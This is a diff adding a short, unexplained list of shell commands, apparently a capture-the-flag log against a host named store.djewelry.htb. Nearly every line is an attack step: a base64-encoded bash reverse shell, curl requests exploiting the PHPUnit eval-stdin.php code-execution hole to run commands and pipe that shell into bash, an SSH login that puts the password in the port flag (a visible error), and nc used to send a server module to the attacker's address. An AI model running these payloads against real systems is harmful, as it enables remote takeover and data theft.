@@ -1,0 +1,10 @@
+echo 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' | base64
+curl --data '<?php echo(shell_exec('cat Default.php'));' http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+curl --data "<?php echo(shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMy80NDMgMD4mMQo= | base64 -d | bash'));" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ssh steven@10.10.11.124 -p ihatehackers
+cat user.txt
+cd /usr/lib/apache2/modules
+nc 10.10.16.33 < mod_reader.so
+nc -lvp 443 > mod_reader.so
+strings mod_reader.so | less
+
